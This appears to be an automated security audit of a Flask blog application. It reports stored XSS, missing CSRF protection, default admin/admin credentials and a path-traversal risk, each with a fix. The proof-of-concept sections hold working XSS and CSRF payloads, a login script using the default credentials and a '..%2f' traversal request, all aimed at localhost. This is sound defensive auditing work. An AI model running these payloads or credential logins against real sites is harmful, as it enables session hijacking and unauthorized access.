====

Auto Security Analysis of blog at 2026-02-21
CRITICAL - Stored XSS in Post Content
The application uses the `markdown2` library to render blog post content from Markdown to HTML. However, it does not enable safe mode or sanitize the resulting HTML. Furthermore, the Jinja2 template `post.html` uses the `|safe` filter on the content. This allows an attacker (or a compromised admin) to inject arbitrary JavaScript into blog posts, which will execute in the context of any user visiting the post. This is a critical security concern as it can lead to session hijacking, defacement, or redirection to malicious sites.

PoC
```python
import requests

session = requests.Session()

# Login
login_url = "http://localhost:5000/login"
data = {
    "username": "admin",
    "password": "admin"
}
session.post(login_url, data=data)

# Create post with XSS
create_url = "http://localhost:5000/create_post"
data = {
    "title": "XSS Test",
    "author": "Attacker",
    "tags": "test",
    "content": "<script>alert('XSS')</script>"
}
session.post(create_url, data=data)

# Check if XSS is present
post_url = "http://localhost:5000/post/XSS_Test"
r = session.get(post_url)
if "<script>alert('XSS')</script>" in r.text:
    print("XSS confirmed!")
```

Fix
Use `markdown2` with `extras=["safe"]` or use a dedicated sanitization library like `bleach` to clean the HTML before rendering. Also, avoid using `|safe` in Jinja2 templates if the content is not guaranteed to be safe.

====

====

Auto Security Analysis of blog at 2026-02-21
MEDIUM - Missing CSRF Protection
The application does not implement any Cross-Site Request Forgery (CSRF) protection on its state-changing routes, such as `/login`, `/create_post`, and `/upload/`. An attacker can trick an authenticated admin into visiting a malicious website that sends a POST request to the blog, potentially creating unauthorized posts or uploading malicious files.

PoC
```html
<html>
  <body>
    <form action="http://localhost:5000/create_post" method="POST">
      <input type="hidden" name="title" value="CSRF_Post" />
      <input type="hidden" name="author" value="CSRF" />
      <input type="hidden" name="tags" value="csrf" />
      <input type="hidden" name="content" value="<script>alert('CSRF')</script>" />
      <input type="submit" value="Click me" />
    </form>
  </body>
</html>
```

Fix
Use a Flask extension like `Flask-WTF` to automatically add CSRF tokens to all forms and verify them on the server side.

====

====

Auto Security Analysis of blog at 2026-02-21
MEDIUM - Default Admin Credentials
The application uses default credentials `admin` / `admin` for the administrative interface. These are hardcoded as defaults in `utils.py` and provided in the `example.env` file. If the administrator does not change these environment variables, the application is vulnerable to unauthorized access.

PoC
Simply navigate to the `/login` page and enter `admin` for both username and password.

Fix
Force the user to set strong credentials during setup or on first login. Do not provide weak default credentials in the source code or example environment files.

====

====

Auto Security Analysis of blog at 2026-02-21
LOW - Path Traversal in Post Retrieval
The `/post/<name>` route uses the `name` parameter to construct a file path using `os.path.join` without sanitization. While the application appends `.md` and Flask's default routing may restrict some characters, this pattern is inherently dangerous and could lead to unauthorized file disclosure if the environment or configuration changes.

PoC
```python
import requests
# This may be blocked by Werkzeug normalization in some configurations
r = requests.get("http://localhost:5000/post/..%2fREADME")
if r.status_code == 200:
    print("File content disclosure!")
```

Fix
Use `werkzeug.utils.secure_filename` on the `name` parameter before joining it with the directory path to ensure it does not contain path traversal sequences.

====

### Summary of Vulnerabilities

| Severity | Exploit Name |
| --- | --- |
| CRITICAL | Stored XSS in Post Content |
| MEDIUM | Missing CSRF Protection |
| MEDIUM | Default Admin Credentials |
| LOW | Path Traversal in Post Retrieval |
